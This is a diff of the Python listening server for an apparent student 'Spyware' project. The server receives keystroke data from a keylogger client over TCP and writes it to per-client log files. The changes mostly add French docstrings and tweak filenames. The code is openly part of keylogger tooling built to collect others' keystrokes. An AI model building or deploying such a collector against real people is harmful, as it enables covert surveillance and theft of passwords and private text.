@@ -15,6 +15,14 @@ TXT_GLOB = ""
 
 
 def argument():
+
+    """
+         Cette fonction utilise le module argparse pour définir et analyser des arguments de ligne de commande
+         pour un programme le projet Spyware.
+         :return: L'argument
+
+     """
+
     p = argparse.ArgumentParser(description='Projet Python - Spyware')
     p.add_argument('-l', '--listen', type=int, help="se met en écoute sur le port TCP saisi par "
                                                                "l'utilisateur et attend les données du spyware UP")
@@ -35,6 +43,14 @@ def kill_all():
 
 
 def chrono():
+
+    """
+    Fonction qui permet d'afficher le chronomètre en seconde.
+    Si les seconde dépasse les 600 s on lance la fonction Kill all.
+    La fonction ne retourne rien
+
+    """
+
     global TXT_GLOB
     while True:
         seconds = 0
@@ -43,12 +59,18 @@ def chrono():
             seconds += 1
             time.sleep(1)
             if seconds % 10 == 0:
-                print("Ajout de data")  # si pas de reponse du client, on kill tout
+                print("Ajout de data")  # si pas de réponse du client, on kill tout
             if seconds == 600:
                 kill_all()
 
 
 def commands():
+
+    """
+    La fonction demande un
+    La fonction ne retourne rien
+    """
+
     while True :
         cmd = input(">>>")
         parse = cmd.split()
@@ -73,13 +95,11 @@ def receiver(port):
 
     print(f"Ecoute sur {SRV}:{port}")
 
-    time = datetime.datetime.now().time()
-    f_time = time.strftime("%Hh%M")
-
     while True:
         client_socket, client_address = server_socket.accept()
-        ficname = f"{client_address[0]}-{datetime.date.today()}-{f_time}-keyboard.txt"
 
+
+        ficname = f"{client_address[0]}-{datetime.date.today()}-keyboard.txt"
         # recu data
         with open("/keylogs/data/" + ficname, "a") as f:
             data = client_socket.recv(1024)
@@ -132,5 +152,3 @@ if __name__ == '__main__':
         commands_t = threading.Thread(target=commands)
 
         commands_t.start()
-
-# Numéroté les threads pour kill <port> un seul thread ou kill all pour tout kill
